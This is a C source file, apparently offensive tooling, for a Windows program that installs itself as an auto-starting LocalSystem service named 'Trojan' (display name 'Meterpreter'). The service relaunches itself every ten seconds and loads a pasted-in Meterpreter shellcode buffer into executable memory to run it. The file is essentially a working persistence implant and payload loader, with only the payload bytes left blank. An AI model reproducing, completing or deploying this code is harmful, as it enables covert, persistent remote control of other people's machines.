/* Copyright (c) 2007, Determina Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of Determina Inc. nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include <stdio.h>

#define SERVICE_NAME  "Trojan"
#define DISPLAY_NAME  "Meterpreter"
#define SLEEP_TIME 10000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void ConnectService() 
{
// Your meterpreter shell here
unsigned char buf[] = 
"";


    LPVOID buffer = (LPVOID)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(buffer,buf,sizeof(buf));
    HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(buffer),NULL,0,NULL);
    WaitForSingleObject(hThread,INFINITE);
    CloseHandle(hThread);
}

void start_shell()
{   
    DWORD err = 0;
    char path[MAX_PATH];
    char cmd[MAX_PATH];

    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        err = GetLastError();
        return;
        
    }

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_information;

    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);

    ZeroMemory(&process_information, sizeof(process_information));
    if (CreateProcess(path, path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                      NULL, &startup_info, &process_information) == 0)
    {
        return;
    }
    WaitForSingleObject(process_information.hProcess, INFINITE);

}


void ServiceControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;

    case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;

	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
    default:
        break;
    }

    
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    return;
}

void ServiceMain(int argc, char** argv) {
    
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    ServiceStatusHandle = RegisterServiceCtrlHandler(
        SERVICE_NAME, 
        (LPHANDLER_FUNCTION)ServiceControlHandler
        );
    if (ServiceStatusHandle == 0) {
                exit(1);
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {

        start_shell(); 
        Sleep(SLEEP_TIME);

    }
    return;
}

BOOL install_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    char path[MAX_PATH];

    if (!GetModuleFileName(NULL, path, MAX_PATH)) {
                return FALSE;
    }

    char cmd[MAX_PATH];
    int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);

    if (len < 0 || len == sizeof(cmd)) {
        return FALSE;
    }

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    if (hSCManager == NULL) {
                return FALSE;
    }


    hService = CreateService(
        hSCManager,
        SERVICE_NAME,
        DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        cmd,
        NULL,
        NULL,
        NULL,
        NULL,   /* LocalSystem account */
        NULL
    );

    if (hService == NULL) {

        CloseServiceHandle(hSCManager);
        return FALSE;
    }
    
    char* args[] = { path, "service" };

    if (StartService(hService, 2, (const char**)&args) == 0) {
        DWORD err = GetLastError();

        if (err != ERROR_SERVICE_ALREADY_RUNNING) {

            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }


    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return TRUE;
}


void start_service()
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
        exit(1);
    }
}


int main(int argc, char** argv) {

     if (argc == 2) {

        if (strcmp(argv[1], "install") == 0) {
            
            install_service();
            return 0;
        }

        else if (strcmp(argv[1], "service") == 0) {
        
            start_service();
            return 0;
        }

    }
    
    ConnectService();
    return 0;
}

